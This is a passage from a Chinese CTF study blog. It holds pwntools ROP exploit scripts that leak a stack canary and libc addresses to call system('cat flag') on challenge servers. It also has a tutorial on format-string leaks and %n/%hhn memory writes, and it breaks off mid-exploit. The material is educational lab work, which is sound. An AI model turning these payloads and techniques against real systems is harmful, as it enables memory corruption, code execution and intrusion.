p64(system_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401164947443.png" class="" title="image-20220401164947443"><p>这里有个地方要注意一下</p><p>在构造ROP链的时候直接打印puts，write，read函数地址，然后如果下面没有stop gadget的话，在下面ecv()的时候，如果是process就可以接收到，但是remote就EOF了，如果在构造ROP链的时候在 p64(pop_rdi_addr) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’])  之后加一个stop gadgets，这样就可以了，估计是没加stop_gadgets，还没有recv，程序就挂了, 比如下面这种代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">c = io.recv()</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x04008a3</span></span><br><span class="line">pop_r13_r14_r15_addr = <span class="number">0x040089e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload += p64(pop_r13_r14_r15_addr)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])             <span class="comment"># shellcode start</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(0x004007CD)如果没有这一行的话会出错，0x4007CD是main函数的地址</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401165619032.png" class="" title="image-20220401165619032"><h2 id="10-pwn1"><a href="#10-pwn1" class="headerlink" title="10. pwn1"></a>10. pwn1</h2><p>厦门邀请赛</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401212456041.png" class="" title="image-20220401212456041"><p>IDA打开分析</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401212354774.png" class="" title="image-20220401212354774"><p>存在栈溢出漏洞，但是程序开了栈保护，所以得首先泄露出canary</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401212547940.png" class="" title="image-20220401212547940"><p>由于程序是输入2是打印，所以可以输入足够长的数据一直到正好不覆盖canary，然后输入1，将cannary顺带这打印出来，就达到了泄露canary的目的，</p><p>这样就可以构造ROP链打印puts函数地址然后再返回main函数，打印puts函数地址是为了获取libc的基地址，进而获得system函数的地址，重新回到main函数这里是为了再次输入构造ROP链执行system(“bin/sh”)，但是执行system(“bin/sh”)的时候有问题，服务器总是提示错误，于是我将bin/sh的地址换成了ls的地址，可以打印出目录下的文件，所以还需要调用read函数。输入’cat flag’， 然后执行system(‘cat flag’)</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401213108316.png" class="" title="image-20220401213108316"><p>cat flag字符串把它存在0x601000的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;babystack&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)  </span></span><br><span class="line"><span class="comment"># io = process(&quot;babystack&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">56538</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x0400a93</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x0400a91</span></span><br><span class="line">main_addr = <span class="number">0x0400908</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">136</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">cnanry_byte = io.recv(<span class="number">7</span>)</span><br><span class="line">canary = u64(cnanry_byte.rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary : 0x%x&quot;</span>  % canary)</span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x000000601000</span> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(canary) +p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)           <span class="comment"># rdi = 0</span></span><br><span class="line">payload += p64(pop_rsi_r15_addr) +p64(cat_flag_addr) + p64(<span class="number">0</span>) <span class="comment"># rsi = 0x00000601000 </span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])             <span class="comment"># read(0, rsi, ?)#</span></span><br><span class="line">payload += p64(main_addr)<span class="comment"># 重新回到main函数，为了 执行system(&quot;cat flag&quot;)</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_address =  u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_address: %s&quot;</span> % <span class="built_in">hex</span>(puts_address))</span><br><span class="line">libc_base = puts_address - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;cat flag&#x27;</span>)<span class="comment">#read函数的时候，输入cat flag</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base +  libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">136</span> + p64(canary) +p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400A2A</span>)<span class="comment"># ret</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(cat_flag_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401212331144.png" class="" title="image-20220401212331144">]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第9章_格式化字符串</title>
      <link href="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>格式化字符串漏洞如今在桌面端已经比较少见了，但在物联网设备上依然层出不穷。</p><p>原理通过一个例子来说明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %s %x %x %x %3$s&quot;</span>, <span class="string">&quot;Hello World!&quot;</span>, <span class="number">233</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -m32 -z execstack -no-pie -fno-stack-protector main.c </span><br></pre></td></tr></table></figure><p>gdb 调试起来，在printf函数那下断点，观察参数</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325161725015.png" class="" title="image-20220325161725015"><p>此时栈上的参数为这些（绿色），但是<code>%s %d %s %x %x %x %3$s</code> ( %$3s 是打印可变参数中的第3个，以字符串的形式打印), 但是由于格式化要求的参数和实际提供的参数不一致，所以它会继续从栈上取参数，即红色的部分，这样就造成了数据的泄露</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325161852994.png" class="" title="image-20220325161852994"><p>所以，格式化字符串漏洞发生的条件就是 <strong>格式字符串要求的参数和实际提供的参数不匹配</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于格式化字符串漏洞的利用主要有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖</p><h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><p>在Linux中，存取无效的指针会使进程收到SIGSEGV信号，从而使程序非正常终止并产生核心转储，其中存储了程序崩溃时的许多重要信息，而这些信息正是攻击者所需要的。使用类似下面的格式字符串即可触发崩溃。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure><ol><li>对于每一个%s, printf 都要从栈上获取一个数字，将其视为字符串的地址进行打印，直到出现一个空字符</li><li>获取的某个数字可能不是一个地址</li><li>获取的数字确实是一个地址，但是这个地址时受保护的</li></ol><h3 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h3><p>使程序崩溃只是验证漏洞的第一步，攻击者还可以利用格式化函数获得内存数据，为漏洞利用做准备。</p><p>用以下代码测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> arg1 = <span class="number">1</span>, arg2 =<span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -m32 -fno-stack-protector -no-pie main.c -o fmtdemo</span><br></pre></td></tr></table></figure><p>输入 %08x.%08x.%08x.%08x.%08x 作为格式化字符串</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325200421292.png" class="" title="image-20220325200421292"><p>观察栈，绿框中是5个参数</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325200525380.png" class="" title="image-20220325200525380"><p>因为输入了5个%08x，所以在可变参数中要打印出5个来，而现在只有4个，剩下那个它就顺着栈继续往下找了，即打印的0xffffcf64</p><p>现在已经知道了如何按顺序泄露栈数据，那么如果<strong>想直接泄露指定的某个数据</strong>，则可以用下面类似的格式字符串，这里的n表示位于格式字符串后的第n个数据，即可变参数中第几个（从1开始）</p><p><code>%&lt;arg#&gt;$&lt;format&gt;</code> 例如 <code>%3$x</code>表示以16进制形式打印第3个可变参数，下面进行测试</p><p>输入: %3$x.%1$08x </p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325201248837.png" class="" title="image-20220325201248837"><p>输出: </p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325201352036.png" class="" title="image-20220325201352036"><h3 id="任意地址内存泄露"><a href="#任意地址内存泄露" class="headerlink" title="任意地址内存泄露"></a>任意地址内存泄露</h3><p>我们可以使用类似%s格式规范，可以泄露出参数（指针）所指向的内存的数据，程序会将它作为一个ASCII字符串处理，直到遇到空字符，如果我们可以操控这个参数的值，那么就可以泄露出任意地址的内容。</p><p>输入%4$s，然后在<code>call   0x8048350 &lt;printf@plt&gt;</code>调用前下断点，观察栈的情况</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325202235301.png" class="" title="image-20220325202235301"><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325202354813.png" class="" title="image-20220325202354813"><p>接下来尝试获取任意内存的数据，输入AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325203112487.png" class="" title="image-20220325203112487"><p>发现0X41414141存在可变参数的第13个位置上，所以，只要输入AAAA%13$s就可以读取0x41414141这个地址的数据了，虽然0x41414141并不是个有效的地址，但是我们可以把它变为合法的地址然后再次输入</p><p>比如ABCD字符串的地址是0xffffcf5a，所以我们用此地址测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\x5a\xcf\xff\xff.%13$s&quot;)&#x27;</span> &gt; text</span><br></pre></td></tr></table></figure><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325210455408.png" class="" title="image-20220325210455408"><p>于是打印出了字符串ABCD，我们可以利用这种方法，把某函数的GOT地址传进去，这样就可以得到虚拟地址了，然后根据其在libc的偏移吗，就可以得到任意函数地址，比如 system()</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325212111456.png" class="" title="image-20220325212111456"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;\x18\xa0\x04\x08&#x27; + &#x27;.%13<span class="variable">$s</span>&#x27;)&quot;</span> &gt; text </span><br></pre></td></tr></table></figure><p>这里用 0x804a00c 这个地址的话会有问题，估计是<code>r &lt; ./text</code>的原因，书上说的是不可见字符的原因，同样会被省略的还有\x07, \x08, \x20等</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325212038410.png" class="" title="image-20220325212038410"><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325212622582.png" class="" title="image-20220325212622582"><p>虽然0xf7e3fe00仍然是个指针，不是字符数据，打印并不成功，但是借助pwntools可以得到地址数据并进行利用（后面看到这里的时候再说。。。。）</p><h3 id="栈数据覆盖"><a href="#栈数据覆盖" class="headerlink" title="栈数据覆盖"></a>栈数据覆盖</h3><p>通过%n转换提示符，可以将当前已经成功写入流或缓冲区的字符个数存储到由参数指定的整数中。</p><p>测试代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %n\n&quot;</span>, str, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325213757423.png" class="" title="image-20220325213757423"><p>回到fmtdemo那个程序，尝试将argv2改为其他0x20</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325214009310.png" class="" title="image-20220325214009310"><p>看到argv2的地址时0xffffcf38，于是构造字符串’\x38\xcf\xff\xff%08x%08x%012x%13$n’ 在printf那里下断点</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325220039166.png" class="" title="image-20220325220039166"><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220325215827989.png" class="" title="image-20220325215827989"><h3 id="任意地址内存覆盖"><a href="#任意地址内存覆盖" class="headerlink" title="任意地址内存覆盖"></a>任意地址内存覆盖</h3><p>用上面的方法 ‘\x38\xcf\xff\xff%08x%08x%012x%13$n’ ，只能赋值最小为4的数据，因为前面’\x38\xcf\xff\xff’ 就占了4个字节</p><p>使用’AA%15$nA’ + ‘\x38\xcf\xff\xff’ 的方法就可以赋值 &lt; 4的数据， 要是赋值一个特别大的数据怎么办，可以直接类似%0123214c的形式，但是这样做占用的内存空间太大，往往会覆盖其他重要的地址而出错。所以，我们尝试通过修改长度修饰符来更改值的大小。</p><p>%hhn(单字节), %hn(双字节), %n(4字节), %ln(8字节), %lln(16字节)</p><p> 接下来我们尝试将0x12345678写入到0xffffcf38的位置, 先尝试输入AAAABBBBCCCCDDDD来看看这几个参数的位置。发现是可变参数的13,14,15,16的位置</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326093826641.png" class="" title="image-20220326093826641"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffcf64</span> -&gt; <span class="number">0x41414141</span> (<span class="number">0xffffcf38</span>) -&gt; \x78</span><br><span class="line"><span class="number">0xffffcf68</span> -&gt; <span class="number">0x42424242</span> (<span class="number">0xffffcf39</span>) -&gt; \x56</span><br><span class="line"><span class="number">0xffffcf6c</span> -&gt; <span class="number">0x43434343</span> (<span class="number">0xffffcf40</span>) -&gt; \x34</span><br><span class="line"><span class="number">0xffffcf70</span> -&gt; <span class="number">0x44444444</span> (<span class="number">0xffffcf41</span>) -&gt; \x12</span><br></pre></td></tr></table></figure><p> 构造特殊格式化字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;\x38\xcf\xff\xff&#x27;</span> + <span class="string">&#x27;\x39\xcf\xff\xff&#x27;</span>+ <span class="string">&#x27;\x3a\xcf\xff\xff&#x27;</span>+ <span class="string">&#x27;\x3b\xcf\xff\xff&#x27;</span> + </span><br><span class="line"> <span class="string">&#x27;%104c%13$hhn&#x27;</span> + <span class="string">&#x27;%222c%14$hhn&#x27;</span> + <span class="string">&#x27;%222c%15$hhn&#x27;</span> + <span class="string">&#x27;%222c%16$hhn&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\x38\xcf\xff\xff\x39\xcf\xff\xff\x3a\xcf\xff\xff\x3b\xcf\xff\xff%104c%13\$hhn%222c%14\$hhn%222c%15\$hhn%222c%16\$hhn&quot;</span> &gt; text</span><br></pre></td></tr></table></figure><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326100323346.png" class="" title="image-20220326100323346"><p>运行printf之后</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326100244790.png" class="" title="image-20220326100244790"><h3 id="x86-64中的格式化字符串漏洞"><a href="#x86-64中的格式化字符串漏洞" class="headerlink" title="x86-64中的格式化字符串漏洞"></a>x86-64中的格式化字符串漏洞</h3><p>在Linux中，前6个参数分别通过RDI, RSI, RDX, RCX, R8, R9传递，在Windows中，前4个参数通过RCX, RDX, R8, R9传递。</p><p>将程序编译成64位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g  -z execstack -no-pie -fno-stack-protector main.c -o fmtdemo64</span><br></pre></td></tr></table></figure><p>gdb调试， 输入 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326101252681.png" class="" title="image-20220326101252681"><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326101318213.png" class="" title="image-20220326101318213"><p>可以发现AAAAAAAA在%8$p的位置，这个时候我们无法修改argv2的值了，因为她被放在了寄存器中</p><h2 id="fmtstr模块"><a href="#fmtstr模块" class="headerlink" title="fmtstr模块"></a>fmtstr模块</h2><p>通过下面例子练习fmtstr模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(str, <span class="string">&#x27;\0&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">        read(<span class="number">0</span>, str, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便测试，关闭ASLR， 关闭PIE。思路就是将printf的地址改为system的地址，然后输入参数/bin/sh 来get shell</p><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 